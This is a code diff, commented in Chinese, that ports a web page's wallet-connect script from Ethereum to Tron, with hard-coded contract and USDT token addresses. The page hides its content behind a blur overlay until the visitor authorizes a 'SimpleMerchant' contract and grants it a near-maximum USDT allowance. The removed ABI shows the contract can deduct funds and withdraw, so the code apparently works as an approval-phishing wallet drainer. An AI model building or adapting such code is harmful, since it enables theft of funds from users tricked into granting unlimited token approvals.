@@ -1,66 +1,55 @@
-// --- 配置常量 (与之前类似) ---
-const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // 你的 SimpleMerchantERC 合约地址 (USDT)
-const USDC_CONTRACT_ADDRESS_TOKEN = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'; // 你的 USDC Token 合约地址
-const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; //  你的 USDT 合约地址
-const CONTRACT_ABI = [ // SimpleMerchantERC 的 ABI
-    "function connectAndAuthorize() external",
-    "function authorized(address customer) external view returns (bool)",
-    "event Authorized(address indexed customer, address indexed token)",
-    "event Deducted(address indexed customer, address indexed token, uint256 amount)",
-    "event EthReceived(address indexed sender, uint256 amount)",
-    "event Withdrawn(uint256 amount)",
-];
-const ERC20_ABI = [
-    "function approve(address spender, uint256 amount) external returns (bool)",
-    "function balanceOf(address) view returns (uint256)",
-    "function allowance(address owner, address spender) external view returns (uint256)"
-];
+// --- 配置常量 ---
+// 尽管你提供了 EVM 格式地址，但由于 DApp 运行在 Tron 上，
+// 我们使用你提供的 Tron Base58 地址来实例化合约。
+const TRON_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 SimpleMerchant 合约地址 (Tron)
+const TRC20_USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // 你的 USDT TRC20 地址
+// const TRC20_USDC_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; // USDC 已注释
+
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
-// --- UI 元素 (与之前类似) ---
+// SimpleMerchantContract 的 ABI
+const CONTRACT_ABI = [ 
+    "function connectAndAuthorize() external",
+    "function authorized(address customer) external view returns (bool)",
+];
+const TRC20_ABI = [ // TRC20 的 ABI
+    "function approve(address spender, uint256 amount) returns (bool)",
+    "function balanceOf(address) view returns (uint256)",
+    "function allowance(address owner, address spender) view returns (uint256)"
+];
+
+
+// --- UI 元素 (保持不变) ---
 const connectButton = document.getElementById('connectButton');
-const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
+const blurOverlay = document.getElementById('blurOverlay'); 
 const overlayMessage = document.getElementById('overlayMessage');
 const lockedPrompt = document.getElementById('lockedPrompt');
-const overlay = document.getElementById('blurOverlay');  // 确保在这里定义
-const statusDiv = document.getElementById('status');  //  获取 status 元素，在外面定义，避免重复获取。
+const overlay = document.getElementById('blurOverlay');  
+const statusDiv = document.getElementById('status');  
 
-// --- 状态变量 ---
-let provider;
-let signer;
+// --- 状态变量 (使用 TronWeb 变量) ---
+let tronWeb; 
 let userAddress;
-let contract;
-let usdtContract;
-let usdcContract;
+let contractInstance; // SimpleMerchant 合约实例
+let usdtContractInstance; // USDT TRC20 实例
+// let usdcContractInstance; // USDC 已注释
 let isConnectedFlag = false;
-let accountChangeListener = null;  // 存储账号改变的监听器
-let chainChangeListener = null;    // 存储链改变的监听器
 
-// --- 遮罩控制函數 ---
+// --- 遮罩控制函數 (保持不变) ---
 function hideOverlay() {
-    if (!overlay) {
-        console.error("Overlay element not found.");
-        return;
-    }
+    if (!overlay) { console.error("Overlay element not found."); return; }
     overlay.style.opacity = '0';
-    setTimeout(() => {
-        overlay.style.display = 'none';
-    }, 300);
+    setTimeout(() => { overlay.style.display = 'none'; }, 300);
 }
 
 function showOverlay(message) {
-    if (!overlay) {
-        console.error("Overlay element not found.");
-        return;
-    }
+    if (!overlay) { console.error("Overlay element not found."); return; }
     overlayMessage.innerHTML = message;
     overlay.style.display = 'flex';
-    setTimeout(() => {
-        overlay.style.opacity = '1';
-    }, 10);
+    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
 }
 
-// --- 状态更新函数 ---
+// --- 状态更新函数 (保持不变) ---
 function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
     if (connectButton) {
@@ -72,17 +61,14 @@ function updateConnectionUI(connected, address = null) {
             connectButton.classList.remove('connected');
             connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
             connectButton.title = 'Connect Wallet';
-            hideOverlay(); // 隐藏遮罩
+            hideOverlay(); 
         }
     }
 }
 
-// --- 核心功能：控制状态栏的隐藏与显示。 ---
+// --- 核心功能：控制状态栏的隐藏与显示。 (保持不变) ---
 function updateStatus(message) {
-    if (!statusDiv) {
-        console.error("Status element not found.");
-        return; // 避免设置 innerHTML
-    }
+    if (!statusDiv) { console.error("Status element not found."); return; }
     if (message) {
         statusDiv.innerHTML = `${message}`;
         statusDiv.style.display = 'block';
@@ -92,29 +78,35 @@ function updateStatus(message) {
     }
 }
 
-// ---  检查授权状态 ---
+// ---  TronWeb 检查授权状态 ---
 async function checkAuthorization() {
     try {
-        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
-            showOverlay('Wallet not opened. Please connect.');
+        // 移除 usdcContractInstance 检查
+        if (!tronWeb || !userAddress || !contractInstance || !usdtContractInstance) {
+            showOverlay('Wallet not connected. Please connect.');
             return;
         }
 
-        const isAuthorized = await contract.authorized(userAddress); // 检查 SimpleMerchant 合约授权
+        // 1. SimpleMerchant 合约授权检查
+        const authorizedResult = await contractInstance.authorized(userAddress).call();
+        const isAuthorized = authorizedResult; 
+        
 
-        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
-        const isUsdtMaxApproved = usdtAllowance >= BigInt(ALMOST_MAX_UINT); //  檢查是否接近最大值
-        let usdtBalance = 0n;
+        // 2. USDT 授权和余额检查
+        const usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
+        const usdtAllowance = BigInt(usdtAllowanceRaw);
+        const isUsdtMaxApproved = usdtAllowance >= BigInt(ALMOST_MAX_UINT); 
+        
+        let usdtBalanceRaw = "0";
         try {
-            usdtBalance = await usdtContract.balanceOf(userAddress);
-        } catch(e) { /* Ignore balance read error */ }
+            usdtBalanceRaw = await usdtContractInstance.balanceOf(userAddress).call();
+        } catch(e) { /* Ignore */ }
+        const usdtBalance = BigInt(usdtBalanceRaw);
+        // Tron 中的 USDT 通常是 6 位小数
+        const formattedUsdtBalance = (Number(usdtBalance) / 10**6).toFixed(2);
 
-        const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
-        const isUsdcMaxApproved = usdcAllowance >= BigInt(ALMOST_MAX_UINT); //  檢查是否接近最大值
-        let usdcBalance = 0n;
-        try {
-            usdcBalance = await usdcContract.balanceOf(userAddress);
-        } catch(e) { /* Ignore balance read error */ }
+
+        // 3. **USDC 相关的代码已完全注释或移除**
 
         let statusMessage = '';
 
@@ -126,7 +118,7 @@ async function checkAuthorization() {
         }
 
         // USDT 的授權狀態
-        statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
+        statusMessage += `USDT Balance: ${formattedUsdtBalance}. `;
         if (isUsdtMaxApproved) {
             statusMessage += `USDT approved ✅.`;
         } else if (usdtAllowance > 0n) {
@@ -135,31 +127,21 @@ async function checkAuthorization() {
             statusMessage += `USDT not approved ❌.`;
         }
 
-        // USDC 的授權狀態
-        statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
-        if (isUsdcMaxApproved) {
-            statusMessage += `USDC approved ✅.`;
-        } else if (usdcAllowance > 0n) {
-            statusMessage += `USDC approval needed ⚠️.`;
-        } else {
-            statusMessage += `USDC not approved ❌.`;
-        }
-
-        // Button state: needs to be clicked if authorization is incomplete
-        const allAuthorized = isAuthorized && isUsdtMaxApproved && isUsdcMaxApproved; // 同时检查 USDT 和 USDC
+        // Button state: 现在只检查 SimpleMerchant 和 USDT
+        const allAuthorized = isAuthorized && isUsdtMaxApproved; 
 
         if (allAuthorized) {
             connectButton.classList.add('connected');
             connectButton.title = 'Disconnect Wallet';
             connectButton.disabled = false;
-            updateStatus(''); // 成功時，清空/隱藏狀態欄
-            hideOverlay(); // 完全授權，隱藏遮罩
+            updateStatus(''); 
+            hideOverlay(); 
         } else {
             connectButton.classList.remove('connected');
-            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
+            connectButton.title = 'Connect Wallet (Complete Authorization)';
             connectButton.disabled = false;
-            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
-            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); // 授權未完成，顯示遮罩
+            updateStatus(''); 
+            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); 
         }
     } catch (error) {
         updateStatus(`Authorization check failed: ${error.message}`);
@@ -168,44 +150,50 @@ async function checkAuthorization() {
     }
 }
 
-// --- 连接钱包逻辑 (使用 Wallet V2 流程) ---
+// --- 连接钱包逻辑 (使用 TronLink/TronWeb 流程) ---
 async function connectWallet() {
     try {
-        if (typeof window.ethereum === 'undefined') {
-            updateStatus('Please install MetaMask or a supported wallet');
+        if (typeof window.tronWeb === 'undefined') {
+            updateStatus('Please install TronLink or a supported Tron wallet.');
+            showOverlay('Please install TronLink or a supported Tron wallet.');
             return;
         }
-        updateStatus('Connecting to wallet...'); //  在开始连接时，显示状态
-        showOverlay('Please confirm the connection request in your wallet...');
+        
+        // 确保 TronLink 已解锁
+        await window.tronLink.request({ method: 'tron_requestAccounts' });
 
-        // 1. Request account access (连接请求)
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        userAddress = accounts[0]; // 获取用户地址
+        tronWeb = window.tronWeb;
+        userAddress = tronWeb.defaultAddress.base58; // 获取用户的 Base58 地址
+
+        if (!userAddress) {
+            throw new Error("Could not retrieve Tron account address. Please ensure TronLink is logged in.");
+        }
+        
         console.log("✅ User Address:", userAddress);
-        updateConnectionUI(true, userAddress);  // 更新连接状态
+        updateConnectionUI(true, userAddress);
 
-        // 2. 获取 provider, signer 和合约实例
-        provider = new ethers.BrowserProvider(window.ethereum);
-        signer = await provider.getSigner();
-        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer);  // 使用新的 USDC 合约地址
+        // 实例化 SimpleMerchant 合约
+        contractInstance = await tronWeb.contract(CONTRACT_ABI, TRON_CONTRACT_ADDRESS);
 
-        // 3. 检查授权状态 并处理
+        // 实例化 TRC20 合约
+        usdtContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDT_ADDRESS);
+        // usdcContractInstance = await tronWeb.contract(TRC20_ABI, TRC20_USDC_ADDRESS); // USDC 已注释
+
+        // 检查授权状态 并处理
         await handleAuthorization();
 
     } catch (error) {
         console.error("Error connecting to wallet:", error);
         updateConnectionUI(false);
         showOverlay(`🔴 Connection failed: ${error.message}`);
-        updateStatus(`Connection failed: ${error.message}`); //  显示错误信息
+        updateStatus(`Connection failed: ${error.message}`);
     }
 }
 
 // --- 处理授权流程 ---
 async function handleAuthorization() {
     try {
-        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
+        if (!tronWeb || !userAddress) {
             showOverlay('Wallet not connected. Please connect.');
             return;
         }
@@ -217,31 +205,29 @@ async function handleAuthorization() {
         updateStatus(`Authorization failed: ${error.message}`);
     }
 }
+
 // --- 斷開錢包連接 ---
 function disconnectWallet() {
     userAddress = null;
-    provider = null;
-    signer = null;
-    contract = null;
-    usdtContract = null;
-    usdcContract = null;
+    tronWeb = null;
+    contractInstance = null;
+    usdtContractInstance = null;
+    // usdcContractInstance = null; // USDC 已注释
     updateConnectionUI(false);
     showOverlay('Please link your wallet to unlock the page 🔒');
 }
 
-// 事件监听器 (与之前类似)
+// 事件监听器 (保持不变)
 connectButton.addEventListener('click', () => {
     if (isConnectedFlag) {
-        disconnectWallet(); // 断开钱包
+        disconnectWallet(); 
     } else {
-        connectWallet(); // 连接钱包
+        connectWallet(); 
     }
 });
 
-// 页面加载完成后，初始化
+// 页面加载完成后，初始化 (保持不变)
 window.onload = () => {
-    // 确保在页面加载时，显示未连接的 UI
-    updateConnectionUI(false); // 初始 UI 状态
-    //  在页面加载的时候，显示提示
+    updateConnectionUI(false); 
     showOverlay('Please connect your wallet to unlock the content. Click the wallet icon in the upper right corner.');
 };
